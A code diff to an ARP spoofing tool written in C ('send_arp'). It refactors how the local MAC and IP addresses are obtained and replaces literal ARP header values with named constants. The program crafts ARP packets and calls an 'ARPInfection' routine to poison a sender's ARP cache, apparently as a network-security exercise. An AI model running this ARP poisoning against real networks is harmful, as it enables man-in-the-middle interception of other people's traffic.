@@ -13,6 +13,10 @@
 #include <arpa/inet.h>
 #include <stdint.h>
 
+#define HWTYPE_ETHER   0x01
+#define IP_LENGTH	   0x04
+#define ETHER_LENGTH   0x06
+#define ETHERTYPE_IP   0x0800
 #define ETHERTYPE_ARP  0x0806
 
 void usage()
@@ -21,46 +25,20 @@ void usage()
 	printf("ex:    send_arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-static int GetSvrMacAddress( char *pIface, unsigned char *cMacAddr)
-{
-	int nSD;
-	struct ifreq sIfReq;
-	struct if_nameindex *pIfList;
-	struct if_nameindex *pListSave;
-
-	pIfList = (struct if_nameindex *)NULL;
-	pListSave = (struct if_nameindex *)NULL;
-
-	#ifndef SIOCGIFADDR
-	return( 0 );
-	#endif
-
-	nSD = socket( PF_INET, SOCK_STREAM, 0 );
-	if ( nSD < 0 )
-	{
-		printf( "File %s: line %d: Socket failed\n", __FILE__, __LINE__ );
-		return( 0 );
-	}
-
-	pIfList = pListSave = if_nameindex();
-
-	for ( pIfList; *(char *)pIfList != 0; pIfList++ )
-	{
-		if ( strcmp(pIfList->if_name, pIface) )
-			continue;
-		strncpy( sIfReq.ifr_name, pIfList->if_name, IF_NAMESIZE );
-
-		if ( ioctl(nSD, SIOCGIFHWADDR, &sIfReq) != 0 )
-		{
-			printf( "File %s: line %d: Ioctl failed\n", __FILE__, __LINE__ );
-			return( 0 );
-		}
-		memmove( (void *)&cMacAddr[0], (void *)&sIfReq.ifr_ifru.ifru_hwaddr.sa_data[0], 6 );
-		break;
-	}
-	if_freenameindex( pListSave );
-	close( nSD );
-	return( 1 );
+void GetMyInfo(char* dev,unsigned char *my_mac, struct in_addr *my_ip){
+    struct ifreq s;
+    int fd = socket(PF_INET, SOCK_STREAM, 0);
+    strcpy(s.ifr_name, dev);
+    if (ioctl(fd, SIOCGIFHWADDR, &s)) {
+        printf("Can't Get Mac Address!!\n");
+        exit(1);
+    }
+    memcpy(my_mac, s.ifr_addr.sa_data, 6);
+    if (ioctl(fd, SIOCGIFADDR, &s)) {
+        printf("Can't Get IP Address!!\n");
+        exit(1);
+    }
+    memcpy(my_ip, (const void*)&(((sockaddr_in *)&s.ifr_addr)->sin_addr), 4);
 }
 
 void SendPacket(pcap_t* handle, in_addr *src_ip, in_addr *dst_ip, unsigned char *srcMac, unsigned char *dstMac, unsigned short opcode)
@@ -76,11 +54,11 @@ void SendPacket(pcap_t* handle, in_addr *src_ip, in_addr *dst_ip, unsigned char 
 	memcpy(eth_h->ether_shost, srcMac, 6);
 	eth_h->ether_type = htons(ETHERTYPE_ARP);
 
-	arp_h = (struct ether_arp*)(packet + 14);
-	arp_h->ea_hdr.ar_hrd = htons(0x1);
-	arp_h->ea_hdr.ar_pro = htons(0x0800);
-	arp_h->ea_hdr.ar_hln = 0x06;
-	arp_h->ea_hdr.ar_pln = 0x04;
+	arp_h = (struct ether_arp*)(packet + sizeof(struct ether_header));
+	arp_h->ea_hdr.ar_hrd = htons(HWTYPE_ETHER);
+	arp_h->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
+	arp_h->ea_hdr.ar_hln = ETHER_LENGTH;
+	arp_h->ea_hdr.ar_pln = IP_LENGTH;
 	arp_h->ea_hdr.ar_op = htons(opcode);
 	memcpy(arp_h->arp_sha, srcMac, 6);
 	memcpy(arp_h->arp_spa, src_ip, 4);
@@ -156,6 +134,7 @@ int main(int argc, char *argv[])
 	char *dev;
 	struct in_addr sender_ip;
 	struct in_addr target_ip;
+	struct in_addr LocalIP;
 	unsigned char LocalMac[6];
 	unsigned char SenderMac[6];
 
@@ -168,11 +147,9 @@ int main(int argc, char *argv[])
 	dev = argv[1];
 	inet_aton(argv[2], &sender_ip);
 	inet_aton(argv[3], &target_ip);
-	if (!GetSvrMacAddress(dev, LocalMac))
-	{
-		printf("Can't get Local MAC address\n");
-		return 0;
-	}
-	GetTargetMac(dev, &target_ip, &sender_ip, LocalMac, SenderMac);
+	inet_aton("192.168.60.141", &LocalIP);
+	
+	GetMyInfo(dev, LocalMac, &LocalIP);
+	GetTargetMac(dev, &LocalIP, &sender_ip, LocalMac, SenderMac);
 	ARPInfection(dev, &target_ip, &sender_ip, LocalMac, SenderMac);
 }
